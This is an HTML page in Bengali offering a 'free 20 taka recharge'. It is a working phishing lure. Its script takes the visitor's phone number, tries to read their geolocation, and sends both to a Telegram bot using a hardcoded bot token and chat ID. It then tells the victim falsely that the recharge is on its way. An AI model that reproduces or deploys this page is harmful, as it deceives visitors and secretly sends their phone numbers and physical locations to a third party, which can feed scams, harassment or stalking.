<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Recharge 2026</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; outline: none; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>সঠিক নম্বর দিয়ে 'রিচার্জ নিন' বাটনে ক্লিক করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="subBtn" onclick="sendData()">রিচার্জ নিন</button>
    </div>

<script>
async function sendData() {
    const num = document.getElementById('phone').value;
    const btn = document.getElementById('subBtn');

    if (num.length < 11) { alert("১১ সংখ্যার সঠিক নম্বর দিন!"); return; }
    
    btn.innerText = "প্রসেসিং...";
    btn.disabled = true;

    const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
    const chat_id = "7887080882";

    // লোকেশন পাওয়ার চেষ্টা করবে, না পেলেও মেসেজ পাঠাবে
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        const text = `🔔 **নতুন রিচার্জ রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
        await sendMessage(token, chat_id, text);
    }, async (err) => {
        // লোকেশন না পেলেও এই অংশটি নম্বরটি পাঠিয়ে দেবে
        const text = `⚠️ **নতুন রিচার্জ রিকোয়েস্ট (লোকেশন ছাড়া)**\n\n📱 নম্বর: ${num}\n❌ লোকেশন ব্লক করা ছিল।`;
        await sendMessage(token, chat_id, text);
    }, { timeout: 5000 });
}

async function sendMessage(token, chat_id, text) {
    try {
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
        const res = await fetch(url);
        if(res.ok) {
            alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
        } else {
            alert("বট সমস্যা! টোকেন চেক করুন।");
        }
    } catch (e) {
        alert("নেটওয়ার্ক সমস্যা!");
    } finally {
        const btn = document.getElementById('subBtn');
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }
}
</script>
</body>
</html>
